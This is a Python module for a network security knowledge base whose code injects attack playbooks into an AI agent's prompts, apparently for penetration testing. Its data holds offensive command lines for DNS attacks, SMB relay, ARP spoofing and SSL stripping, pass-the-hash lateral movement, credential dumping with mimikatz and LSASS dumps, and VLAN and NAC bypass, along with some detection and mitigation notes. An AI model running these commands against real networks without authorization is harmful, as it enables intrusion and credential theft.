"""Network security knowledge base.

Deep knowledge about network-level vulnerabilities:
1. Protocol attacks (DNS, ARP, DHCP)
2. Network service exploitation
3. Man-in-the-Middle techniques
4. Lateral movement
5. Network segmentation bypass
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class NetworkPattern:
    """A network security pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "high"
    description: str = ""
    detection_strategy: str = ""
    protocols: list[str] = field(default_factory=list)
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:15],
        }


NETWORK_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "net-001", "name": "DNS Security Issues",
        "category": "protocol", "severity": "high",
        "desc": "DNS protocol vulnerabilities and attacks.",
        "detection": (
            "DNS SECURITY:\n"
            "DNS ZONE TRANSFER:\n"
            "  dig axfr @<nameserver> <domain>\n"
            "  host -l <domain> <nameserver>\n"
            "  If successful: full zone data including internal records\n"
            "DNS ENUMERATION:\n"
            "  - Brute force subdomains:\n"
            "    gobuster dns -d <domain> -w <wordlist>\n"
            "    dnsrecon -d <domain> -t brt\n"
            "  - DNSSEC walking (NSEC enumeration):\n"
            "    dnsrecon -d <domain> -t zonewalk\n"
            "  - Reverse DNS: dnsrecon -r <ip-range>\n"
            "DNS CACHE POISONING:\n"
            "  - Requires predictable TXID or lack of source port randomization\n"
            "  - Check: dig +short porttest.dns-oarc.net TXT\n"
            "  - Modern mitigation: DNSSEC, DNS cookies\n"
            "DNS REBINDING:\n"
            "  - Register domain with low TTL\n"
            "  - First request resolves to attacker IP\n"
            "  - Second request resolves to internal IP (127.0.0.1)\n"
            "  - Bypasses same-origin policy for internal access\n"
            "  - Tools: singularity, rebind.network\n"
            "DNS TUNNELING:\n"
            "  - Encode data in DNS queries/responses\n"
            "  - Bypasses network firewalls that allow DNS\n"
            "  - Detection: Look for unusual DNS query lengths, entropy"
        ),
        "protocols": ["dns"],
        "tools": ["dig", "dnsrecon", "gobuster"],
    },
    {
        "id": "net-002", "name": "SMB/NetBIOS Exploitation",
        "category": "service", "severity": "critical",
        "desc": "SMB/CIFS and NetBIOS attack patterns.",
        "detection": (
            "SMB/NETBIOS EXPLOITATION:\n"
            "ENUMERATION:\n"
            "  nmap -p 139,445 --script=smb-enum-* <target>\n"
            "  enum4linux -a <target>\n"
            "  smbclient -L //<target> -N  # Anonymous listing\n"
            "  crackmapexec smb <target> -u '' -p '' --shares\n"
            "NULL SESSION:\n"
            "  smbclient //<target>/IPC$ -N\n"
            "  rpcclient -U '' -N <target>\n"
            "  - Enumerate: querydispinfo, enumdomusers, enumdomgroups\n"
            "KNOWN VULNERABILITIES:\n"
            "  - EternalBlue (MS17-010, CVE-2017-0144):\n"
            "    nmap --script smb-vuln-ms17-010 <target>\n"
            "  - PrintNightmare (CVE-2021-34527)\n"
            "  - PetitPotam (NTLM relay via MS-EFSRPC)\n"
            "  - sAMAccountName spoofing (CVE-2021-42278/42287)\n"
            "RELAY ATTACKS:\n"
            "  - NTLM relay: ntlmrelayx.py -t <target> -smb2support\n"
            "  - Coerce authentication: Responder, PetitPotam\n"
            "  - Capture: responder -I <interface> -rdwv\n"
            "SHARE ENUMERATION:\n"
            "  - List all shares with permissions\n"
            "  - Check for writable shares\n"
            "  - Look for sensitive files (passwords, configs, backups)"
        ),
        "protocols": ["smb", "netbios"],
        "tools": ["enum4linux", "smbclient", "crackmapexec"],
    },
    {
        "id": "net-003", "name": "ARP Poisoning and MITM",
        "category": "mitm", "severity": "high",
        "desc": "ARP spoofing and man-in-the-middle attacks.",
        "detection": (
            "ARP POISONING AND MITM:\n"
            "ARP SPOOFING:\n"
            "  - arpspoof -i <interface> -t <victim> <gateway>\n"
            "  - ettercap -T -M arp:remote /<victim>// /<gateway>//\n"
            "  - bettercap -eval 'set arp.spoof.targets <victim>; arp.spoof on'\n"
            "TRAFFIC INTERCEPTION:\n"
            "  - Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward\n"
            "  - Capture with tcpdump/wireshark\n"
            "  - SSL stripping: sslstrip -l 8080\n"
            "  - mitmproxy for HTTPS inspection\n"
            "CREDENTIAL CAPTURE:\n"
            "  - Responder: Capture NTLM, HTTP Basic, FTP credentials\n"
            "  - Ettercap: Auto-detect and log credentials\n"
            "  - Bettercap: net.sniff on, set net.sniff.verbose true\n"
            "DETECTION:\n"
            "  - Detect ARP spoofing: arp -a, look for duplicate MACs\n"
            "  - Network monitoring: arpwatch\n"
            "  - IDS signatures for ARP anomalies\n"
            "MODERN MITIGATIONS:\n"
            "  - Dynamic ARP Inspection (DAI)\n"
            "  - 802.1X port-based authentication\n"
            "  - Static ARP entries for critical hosts"
        ),
        "protocols": ["arp", "ethernet"],
        "tools": ["bettercap", "ettercap", "responder"],
    },
    {
        "id": "net-004", "name": "Lateral Movement Techniques",
        "category": "post_exploitation", "severity": "critical",
        "desc": "Techniques for moving between systems.",
        "detection": (
            "LATERAL MOVEMENT:\n"
            "WINDOWS TECHNIQUES:\n"
            "  Pass-the-Hash (PtH):\n"
            "    crackmapexec smb <targets> -u <user> -H <ntlm_hash>\n"
            "    impacket-psexec <domain>/<user>@<target> -hashes :<ntlm_hash>\n"
            "  Pass-the-Ticket (PtT):\n"
            "    export KRB5CCNAME=/path/to/ticket.ccache\n"
            "    impacket-psexec <domain>/<user>@<target> -k -no-pass\n"
            "  WMI Execution:\n"
            "    impacket-wmiexec <domain>/<user>:<pass>@<target>\n"
            "  WinRM:\n"
            "    evil-winrm -i <target> -u <user> -p <pass>\n"
            "  PsExec:\n"
            "    impacket-psexec <domain>/<user>:<pass>@<target>\n"
            "LINUX TECHNIQUES:\n"
            "  SSH Key Reuse:\n"
            "    Find authorized_keys, id_rsa across systems\n"
            "    ssh -i /path/to/key user@<target>\n"
            "  Credential Reuse:\n"
            "    Test discovered credentials on all systems\n"
            "    crackmapexec ssh <targets> -u <user> -p <pass>\n"
            "CREDENTIAL HARVESTING:\n"
            "  - mimikatz: sekurlsa::logonpasswords\n"
            "  - LSASS dump: procdump -ma lsass.exe\n"
            "  - SAM/SYSTEM: reg save HKLM\\SAM sam.hiv\n"
            "  - Kerberoasting: impacket-GetUserSPNs\n"
            "  - AS-REP roasting: impacket-GetNPUsers"
        ),
        "protocols": ["smb", "wmi", "ssh", "winrm"],
        "tools": ["crackmapexec", "impacket", "evil-winrm"],
    },
    {
        "id": "net-005", "name": "VLAN and Segmentation Bypass",
        "category": "network", "severity": "high",
        "desc": "Bypassing network segmentation and VLAN isolation.",
        "detection": (
            "VLAN AND SEGMENTATION BYPASS:\n"
            "VLAN HOPPING:\n"
            "  Double tagging:\n"
            "    - Craft frame with two 802.1Q tags\n"
            "    - Outer tag matches native VLAN of trunk\n"
            "    - Inner tag targets destination VLAN\n"
            "    - yersinia -I <interface> -G  # VLAN attack tool\n"
            "  Switch spoofing:\n"
            "    - Negotiate DTP trunk with switch\n"
            "    - modprobe 8021q; vconfig add <interface> <vlan_id>\n"
            "    - If DTP is enabled, become trunk port\n"
            "FIREWALL BYPASS:\n"
            "  - Source port manipulation: nmap --source-port 53\n"
            "  - IP fragmentation: nmap -f\n"
            "  - Protocol tunneling: DNS, ICMP, HTTP\n"
            "  - IPv6 tunneling (if IPv6 not filtered)\n"
            "NAC BYPASS:\n"
            "  - MAC spoofing: macchanger -r <interface>\n"
            "  - 802.1X bypass: If hub or unmanaged switch\n"
            "  - Pre-auth access: Check for DHCP and DNS before auth\n"
            "TESTING:\n"
            "  1. Identify network segments (traceroute, TTL analysis)\n"
            "  2. Test cross-segment communication\n"
            "  3. Check DTP status on switch ports\n"
            "  4. Test firewall rules with various protocols\n"
            "  5. Check for dual-homed hosts bridging segments"
        ),
        "protocols": ["802.1q", "dtp"],
        "tools": ["yersinia", "nmap", "macchanger"],
    },
]


class NetworkSecurityKB:
    """Network security knowledge base.

    Provides network-level attack patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, NetworkPattern] = {}
        self._log = logger.bind(component="network_security_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load network patterns."""
        for data in NETWORK_PATTERNS:
            pattern = NetworkPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                protocols=data.get("protocols", []),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[NetworkPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_network_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build network security prompt."""
        lines = ["## Network Security Patterns\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
